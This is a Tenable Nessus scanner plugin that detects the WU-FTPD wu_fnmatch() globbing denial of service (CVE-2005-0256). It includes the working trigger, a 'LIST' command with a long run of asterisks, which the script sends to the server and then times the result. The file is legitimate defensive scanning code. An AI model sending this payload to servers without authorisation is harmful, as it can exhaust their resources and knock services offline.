#
# (C) Tenable Network Security, Inc.
#

# References:
# https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=207
#


include("compat.inc");


if (description)
{
  script_id(17602);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2015/12/23 21:38:31 $");

  script_cve_id("CVE-2005-0256");
  script_osvdb_id(14203);

  script_name(english:"WU-FTPD wu_fnmatch() Function File Globbing Remote DoS");
  script_summary(english:"Sends 'LIST *****[...]*.*' to the FTP server");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote FTP server has a denial of service vulnerability."
  );
  script_set_attribute(attribute:"description", value:
"The version of WU-FTPD running on the remote host exhausts all
available resources on the server when it repeatedly receives
the following command :

LIST *****[...]*.*

This issue has been confirmed in WU-FTPD 2.6.2 and earlier.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bad5e32a");
  script_set_attribute(
    attribute:"solution", 
    value:"Apply the latest vendor patches."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_cwe_id(119);
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/03/23");
  script_set_attribute(attribute:"vuln_publication_date", value:"2005/02/25");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

   script_category(ACT_DENIAL);
   script_family(english: "FTP");

   script_copyright(english: "Copyright (C) 2005-2015 Tenable Network Security, Inc.");
   script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
   script_require_ports("Services/ftp", 21);
   exit(0);
}

include("audit.inc");
include('global_settings.inc');
include("ftp_func.inc");

port = get_ftp_port(default: 21);

banner = get_ftp_banner(port: port);

if (safe_checks())
{
 if (egrep(string:banner, pattern:" FTP .*Version (wu|wuftpd)-2\.6\.(1|2|2\(1\)) ")) security_hole(port);
 exit(0);
}

# Uncomment next line if there are too many false positive
# if (report_paranoia <= 0 && banner && "wu" >!< banner) exit(0);

if (!banner || ("Version wu-" >!< banner &&
                "Version wuftpd-" >!< banner))
  exit (0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if (supplied_logins_only && (isnull(login) || isnull(password)))
  audit(AUDIT_SUPPLIED_LOGINS_ONLY);

if (! login) login = "anonymous";
if (! password) password = "nessus@example.com";

for (i = 0; i < 2; i ++)
{
 soc = open_sock_tcp(port);
 if (! soc ||
     ! ftp_authenticate(socket:soc, user:login, pass:password))
  exit(0);
 pasv = ftp_pasv(socket: soc);
 if (! pasv) exit(1);
 soc2 = open_sock_tcp(pasv);
 if (! soc2) exit(1);
 # Above 194 *, the server answers "sorry input line too long"
 if (i)
 send(socket: soc, data: 'LIST ***********************************************************************************************************************************************************************************************.*\r\n');
 else
 send(socket: soc, data: 'LIST *.*\r\n');
 t1 = unixtime();
 b = ftp_recv_line(socket:soc);
 repeat
  data = recv(socket: soc2, length: 1024);
 until (! data);
 t[i] = unixtime() - t1;
 #b = ftp_recv_line(socket:soc);
 close(soc); soc = NULL;
 close(soc2);
}

if (t[0] == 0) t[0] = 1;
if (t[1] > 3 * t[0]) security_hole(port);
